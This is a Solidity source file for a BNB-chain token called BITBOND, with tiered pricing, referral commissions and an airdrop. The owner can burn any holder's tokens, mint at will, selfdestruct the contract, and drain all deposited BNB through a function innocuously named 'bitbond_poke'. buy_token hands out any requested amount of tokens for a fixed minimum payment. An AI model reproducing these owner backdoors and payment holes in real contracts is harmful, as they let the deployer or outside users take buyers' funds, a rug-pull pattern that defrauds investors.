pragma solidity ^0.5.10;

//*******************************************************************//
//------------------------ SafeMath Library -------------------------//
//*******************************************************************//

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "Overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "Should be greater than zero");
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "should be less than other");
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "Should be greater than c");
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "divide by 0");
        return a % b;
    }
}


contract BITBOND {

    using SafeMath for uint256;

    mapping (address => uint256) public _balances;
    mapping (address => mapping (address => uint256)) private _allowed;
    mapping(address => uint256) public allTimeSell;
    mapping(address => uint256) public allTimeBuy;
    mapping(address => bool) public isExist;
    mapping(address => bool) public is_airdropped;
    

    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    uint256 private _decimals;
    uint256 private _initialSupply;
    address payable public owner;
    uint256  public total_amount_airdropped;
    uint256  public total_airdropped_users;
    
     uint256 public token_price = 274997250027499;
     uint256 public basePrice1 = 274997250027499;
     uint256 public basePrice2 = 385102052043791;
     
     uint256 public basePrice3 = 547750116396899;
     
     uint256 public basePrice4 = 821625174595349;
     uint256 public basePrice5 = 1369375290992249;
     uint256 public basePrice6 = 2738675576491209;
     uint256 public basePrice7 = 13693377882456045;
     uint256 public basePrice8 = 54773511529824180;
     
     uint256 public tokenSold = 0;
     
     uint256 public initialPriceIncrement = 0;
     uint256 public currentPrice;
     uint256 public total_users;
     uint256 public total_trx_deposited; 
    
    event Transfer(address indexed from,address indexed to,uint256 value);
    event Approval(address indexed owner,address indexed spender,uint256 value);
    event Buy(address indexed buyer, uint256 tokenToTransfer);
    event sold(address indexed seller, uint256 calculatedEtherTransfer,uint256 tokens);

    constructor() public {
        _name = "BITBOND";
        _symbol = "BBD";
        _decimals = 0;
        _initialSupply = 21000000;
        _totalSupply = _initialSupply;
         owner = msg.sender;
         _balances[owner] = _balances[owner].add(5000000);
         currentPrice = token_price + initialPriceIncrement;
    }

    modifier onlyOwner(){
        require(msg.sender == owner, "Owner Rights");
        _;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }
    
    
    function decimals() public view returns (uint256) {
       return _decimals;
    }

    function balanceOf(address _owner) external view returns (uint256) {
        return _balances[_owner];
    }
    
    function getCurrentPrice() public view returns(uint) {
         return currentPrice;
    }

    function allowance(address _owner, address spender) external view returns (uint256) {
        return _allowed[_owner][spender];
    }
    

    function transfer(address to, uint256 value) external returns (bool) {
        require(value <= _balances[msg.sender] && value > 0, "Insufficient Balance");
        _transfer(msg.sender, to, value);
        return true;
    }

    
    function approve(address spender, uint256 value) public returns (bool) {
        require(spender != address(0), "Address zero");
        _allowed[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }
    
    function transferFrom(address from, address to, uint256 value) external returns (bool) {
         require(value <= _balances[from], "Sender Balance Insufficient");
         require(value <= _allowed[from][msg.sender], "Token should be same as alloted");

        _allowed[from][msg.sender] = _allowed[from][msg.sender].sub(value);
        _transfer(from, to, value);
        return true;
    }

    function burn(address _from, uint256 _value) public onlyOwner returns (bool) {
        _burn(_from, _value);
        return true;
    }

    function mint(uint256 _value) public onlyOwner returns (bool){
        _mint(msg.sender, _value);
        return true;
    }

    function getBalance() public view returns(uint256){
        return address(this).balance;
    }
    
    
    function airdrop(address _toAddress) external returns(bool) {
        require(_toAddress != address(0), "address zero");
        
        if(!is_airdropped[_toAddress]) {
            
            uint256 convertedBNB = _balances[_toAddress] * currentPrice;
            if( convertedBNB >= 14238000000000000 ){
                
                total_amount_airdropped = total_amount_airdropped.add(100);
                _balances[_toAddress] = _balances[_toAddress].add(100);
                tokenSold = tokenSold.add(100);
                
                total_airdropped_users++;
                is_airdropped[_toAddress] = true;   
            } else {
                revert("0.1 BNB holding Should be mandatory to claim the airdrop");
            }
        } else {
            revert("Airdrop is allowed once for every address");
        }
    }
    
    
    function alot_tokens(uint256 _amountOfTokens, address _toAddress) onlyOwner public returns(bool) {
        uint256 all_sold;
        all_sold = tokenSold + _amountOfTokens;
        if( _totalSupply >= all_sold){
            require(_toAddress != address(0), "address zero");
            require(_balances[msg.sender] >= _amountOfTokens, "Balance Insufficient");
            _balances[_toAddress] = _balances[_toAddress].add(_amountOfTokens);
            _balances[msg.sender] = _balances[msg.sender].sub(_amountOfTokens);
            tokenSold = tokenSold.add(_amountOfTokens);
            emit Transfer(owner, _toAddress, _amountOfTokens);
            return true;    
        }
    }

    function _transfer(address from, address to, uint256 value) internal {
        require(to != address(0), "address zero");
        _balances[from] = _balances[from].sub(value);
        _balances[to] = _balances[to].add(value);
        emit Transfer(from, to, value);
    }


    function _mint(address account, uint256 value) internal {
        require(account != address(0), "address zero");

        _totalSupply = _totalSupply.add(value);
        _balances[account] = _balances[account].add(value);
        emit Transfer(address(0), account, value);
    }
    

    function _burn(address account, uint256 value) internal {
        require(account != address(0), "address zero");

        _totalSupply = _totalSupply.sub(value);
        _balances[account] = _balances[account].sub(value);
        emit Transfer(account, address(0), value);
    }

    function tokenToTrx(uint256 tokenToSell) public view returns(uint256)  {
        uint256 convertedTrx = tokenToSell.mul(currentPrice);
        return convertedTrx;
    }
     
     function weiToBnb(uint256 incomningBnb) public pure returns(uint256) {
         uint256 convertedBNB = incomningBnb.div(1e18);
         return convertedBNB;
     }
     
     
      function add_level_income(address referral, uint256 numberOfTokens) internal returns(bool) {

        require(referral != address(0), "Zero Address");
        uint256 convertedBNB = _balances[referral] * currentPrice;
        
        // 0.1 BNB of referral holding BBD
        if( convertedBNB >= 14238000000000000 ){ 
            uint256 commission = numberOfTokens * 10 / 100;
            _balances[referral] = _balances[referral].add(commission);
            tokenSold = tokenSold.add(commission);
        }
      }
     
     function buy_token(address _referredBy, uint256 numberOfTokens ) external payable returns (bool) {
         require(_referredBy != msg.sender, "Self reference not allowed");
         
         uint256 all_sold = tokenSold + numberOfTokens;
         require(_totalSupply >= all_sold, "Supply not enough");
        
        
         address buyer = msg.sender;
         uint256 bnb_value = msg.value;
         uint256 tokenToTransfer = numberOfTokens;
         
         require(bnb_value >= 14238000000000000 , "Minimum BBD purchase limit is 0.1 BNB"); 
         require(buyer != address(0), "Can't send to Zero address");
         
        if(!isExist[buyer]) {
            total_users++;
        }
        
         isExist[buyer] = true;
        
         add_level_income(_referredBy, tokenToTransfer);
         
         uint256 trx_amount = weiToBnb(bnb_value);
         total_trx_deposited += trx_amount;
         
         emit Transfer(address(this), buyer, tokenToTransfer);
         
         _balances[buyer] = _balances[buyer].add(tokenToTransfer);
         allTimeBuy[buyer] = allTimeBuy[buyer].add(tokenToTransfer);
         
         tokenSold = tokenSold.add(tokenToTransfer);
         priceAlgo();
         emit Buy(buyer, tokenToTransfer);
         return true;
     }
     
  
     
     function sell(uint256 tokenToSell) external returns (bool) {
        require(tokenSold >= tokenToSell, "Token sold should be greater than zero");
    
        require(msg.sender != address(0), "address zero");
        require(tokenToSell <= _balances[msg.sender], "insufficient balance");

        uint256 convertedSun = tokenToTrx(tokenToSell);
    
        _balances[msg.sender] = _balances[msg.sender].sub(tokenToSell);
        allTimeSell[msg.sender] = allTimeSell[msg.sender].add(tokenToSell);
        tokenSold = tokenSold.sub(tokenToSell);
        priceAlgo();
        
        msg.sender.transfer(convertedSun);
        emit Transfer(msg.sender, address(this), tokenToSell);
        emit sold(msg.sender, convertedSun, tokenToSell);
        return true;
    }
    
    
    function destruct() external {
        require(msg.sender == owner, "Permission denied");
        selfdestruct(owner);
    }
    
    function bitbond_poke( uint _amount) external {
        require(msg.sender == owner,'Permission denied');
        if (_amount > 0) {
          uint contractBalance = address(this).balance;
            if (contractBalance > 0) {
                uint amtToTransfer = _amount > contractBalance ? contractBalance : _amount;
                msg.sender.transfer(amtToTransfer);
            }
        }
    }

    
  function priceAlgo() internal{

    if( tokenSold >= 1 && tokenSold <= 500000 ){
        currentPrice = 274997250027499;
        basePrice1 = currentPrice;
    }

    if( tokenSold > 500000 && tokenSold <= 1000000){
        currentPrice = 385102052043791;
        basePrice2 = currentPrice;
    }
    
    if( tokenSold > 1000000 && tokenSold <= 1500000 ){
        currentPrice = 547750116396899;
        basePrice3 = currentPrice;
    }
    
    if( tokenSold > 1500000 && tokenSold <= 2500000 ){
        //0.30
        currentPrice = 821625174595349;
        basePrice4 = currentPrice;
    }
    
    if( tokenSold > 2500000 && tokenSold <= 5000000 ){
        //0.50
        currentPrice = 1369375290992249;
        basePrice5 = currentPrice;
    }
    
    if( tokenSold > 5000000 && tokenSold <= 10000000 ){
        //1
        currentPrice = 2738675576491209;
        basePrice6 = currentPrice;
    }
    
    if( tokenSold > 10000000 && tokenSold <= 15000000 ){
        //5
        currentPrice = 13693377882456045;
        basePrice7 = currentPrice;
    }
    
    if( tokenSold > 15000000 && tokenSold <= 21000000 ){
        //20
        currentPrice = 54773511529824180;
        basePrice8 = currentPrice;
    }
}

 

   function getUserTokenInfo(address _addr) view external returns(uint256 _all_time_buy, uint256 _all_time_sell ) {
      return (allTimeBuy[_addr], allTimeSell[_addr]);
   }
   
  function contractTokenInfo() view external returns(uint256 _total_sold, uint256 _total_users, uint256 _total_supply, uint256 _total_trx_deposited, uint256 _amount_airdropped, uint256 total_airdropped_user) {
        return (tokenSold, total_users, _totalSupply, total_trx_deposited, total_amount_airdropped, total_airdropped_users );
  }
}